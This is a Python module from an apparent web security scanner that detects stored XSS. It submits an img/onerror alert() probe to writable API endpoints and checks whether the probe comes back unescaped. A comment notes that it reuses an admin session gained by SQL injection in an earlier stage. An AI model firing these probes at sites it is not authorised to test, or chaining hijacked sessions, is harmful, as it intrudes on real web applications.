"""Stage 5: Stored / persistent XSS.

Reflected and DOM XSS are covered by xss_scan / dom_xss_scan; the remaining
class is stored XSS — a payload written once and served back to every later
viewer. It is write-then-read, so it needs a writable endpoint and a render
location, and usually a session. This submits a unique, self-identifying
payload to writable collection endpoints (using a configured identity when
there is one, anonymously otherwise), re-reads the collection, and confirms
only when the payload comes back with its angle brackets intact — stored and
unescaped. An entity-encoded echo (`&lt;img`) is storage working correctly and
is never reported.
"""

import re
import uuid

from core.auth_harness import AuthHarness
from modules.base import BaseModule
from tools.wrappers import curl

# Common text fields a record stores and later renders.
_TEXT_FIELDS = ("comment", "message", "text", "content", "body", "review",
                "description", "title", "name", "feedback", "note")
# Collection endpoints that typically store user content.
_WRITE_HINTS = ("feedback", "comment", "review", "complaint", "message",
                "post", "note", "memory", "product")


def payload_for(marker: str) -> str:
    """The stored-XSS probe payload. `alert('xss<marker>')` fires cleanly in a
    real browser (vs a bare `onerror=xss<marker>`, which only throws a
    ReferenceError) while keeping the marker for reflection matching."""
    return f"\"><img src=x onerror=alert('xss{marker}')>"


def stored_reflection(body: str, marker: str) -> bool:
    """True iff the unescaped `<img … onerror=…xss<marker>…>` tag is served
    back — i.e. the markup survived with its angle brackets intact."""
    body = body or ""
    # A bare, unescaped tag carrying the marker. The quotes/parens of the
    # payload vary once stored, so match on the tag shape + the marker rather
    # than the exact literal.
    return bool(re.search(r"<img\b[^>]*onerror[^>]*xss" + re.escape(marker),
                          body, re.I))


def _content_type(headers_text: str) -> str:
    for line in (headers_text or "").splitlines():
        if line.lower().startswith("content-type:"):
            return line.split(":", 1)[1].split(";")[0].strip()
    return ""


def is_html_response(headers_text: str) -> bool:
    """Does the response declare an HTML content type? Only then is an
    unescaped tag a rendered-HTML sink rather than a JSON/text echo."""
    ct = _content_type(headers_text).lower()
    return "text/html" in ct or "application/xhtml" in ct


class StoredXSS(BaseModule):
    id = "stored_xss"
    name = "Stored / Persistent XSS"
    stage = 5
    detectability = "high"
    depends_on = ["tech_detection"]
    active = True

    async def run(self) -> str:
        base = self.base_url
        harness = AuthHarness(self.config)
        # Adopt sessions captured earlier in the run (e.g. the admin session
        # auth_bypass obtained via SQLi) so stored XSS is tested authenticated,
        # not just from config identities.
        harness.adopt_discovered(self.state, log=self.log)
        headers = {}
        if harness.identities:
            await harness.establish_all(base)
            ident = harness.usable[0] if harness.usable else None
            if ident:
                headers = ident.request_headers()
                self.log(f"  using identity '{ident.name}' for authenticated writes")

        targets = self._collections(base)
        if not targets:
            self.state.skip_module(self.id, "no writable collection endpoints")
            return "skipped"

        confirmed = 0
        for url in targets[:12]:
            if self.should_stop(reserve=12):
                break
            if await self._probe(base, url, headers):
                confirmed += 1

        self.state.complete_module(self.id)
        self.log(f"Stored XSS: {confirmed} confirmed across "
                 f"{len(targets)} collection(s)"
                 + ("" if headers else " (anonymous — configure auth.identities "
                    "for the authenticated write surface)"))
        return "done"

    def _collections(self, base: str) -> list:
        from urllib.parse import urlparse
        seen, out = set(), []
        for atype in ("api_endpoint", "url", "endpoint"):
            for a in self.state.get_assets_by_type(atype):
                v = str(a.get("value", "")).strip()
                if not v.startswith(("http://", "https://")):
                    continue
                path = urlparse(v).path.lower()
                if re.match(r"^/(?:api|rest)/[a-z][a-z0-9_-]+/?$", path) and \
                        any(h in path for h in _WRITE_HINTS):
                    key = v.rstrip("/")
                    if key not in seen:
                        seen.add(key)
                        out.append(key)
        return out

    async def _probe(self, base: str, url: str, headers: dict) -> bool:
        marker = uuid.uuid4().hex[:10]
        payload = payload_for(marker)
        for field in _TEXT_FIELDS[:4]:
            if self.should_stop(reserve=8):
                break
            body = '{"%s":%s,"rating":1,"captcha":"0"}' % (field, _j(payload))
            try:
                await curl(url, method="POST", output="status", timeout=12,
                           data=body,
                           headers={"Content-Type": "application/json", **headers})
            except Exception:  # noqa: BLE001
                continue
            # Re-read with full headers: the content type decides whether an
            # unescaped tag is a rendered-HTML sink (proven XSS) or a JSON/text
            # echo (stored, but client-side rendering unproven).
            try:
                r = await curl(url, output="full", timeout=12,
                               headers=headers or None)
            except Exception:  # noqa: BLE001
                continue
            if not stored_reflection(r.get("body", ""), marker):
                continue
            html = is_html_response(str(r.get("headers", "")))
            if html:
                self.state.add_finding(
                    title="Stored / persistent XSS",
                    severity="HIGH", confidence="CONFIRMED", verified=True,
                    category="Injection",
                    description=f"A payload submitted to the '{field}' field of "
                                f"{url} is stored and served back in an HTML "
                                f"response with its markup intact (not encoded) — "
                                f"it executes in the browser of every viewer.",
                    evidence=[f"POST {url} {field}=<img onerror=alert()> payload",
                              f"GET {url} → HTML response, payload returned unescaped"],
                    remediation="Output-encode stored content for the HTML "
                                "context on render; validate/sanitise on input.",
                    asset_keys=[f"webapp:{base}"],
                    verification={"method": "stored_xss_html_reflection",
                                  "url": url})
            else:
                ctype = _content_type(str(r.get("headers", ""))) or "non-HTML"
                self.state.add_finding(
                    title="Stored input reflected unescaped (potential stored XSS)",
                    severity="MEDIUM", confidence="FIRM",
                    category="Injection",
                    description=f"A payload submitted to the '{field}' field of "
                                f"{url} is stored and returned unescaped, but in a "
                                f"{ctype} response — this is stored XSS only if a "
                                f"client renders this value as HTML. Confirm the "
                                f"rendering sink before claiming execution.",
                    evidence=[f"POST {url} {field}=<img onerror=alert()> payload",
                              f"GET {url} → {ctype} response, payload returned raw"],
                    remediation="Encode on the HTML render path; if this value is "
                                "ever inserted into the DOM as HTML, it is XSS.",
                    asset_keys=[f"webapp:{base}"],
                    verification={"method": "stored_unescaped_nonhtml",
                                  "url": url})
            return True
        return False


def _j(value: str) -> str:
    import json
    return json.dumps(value)
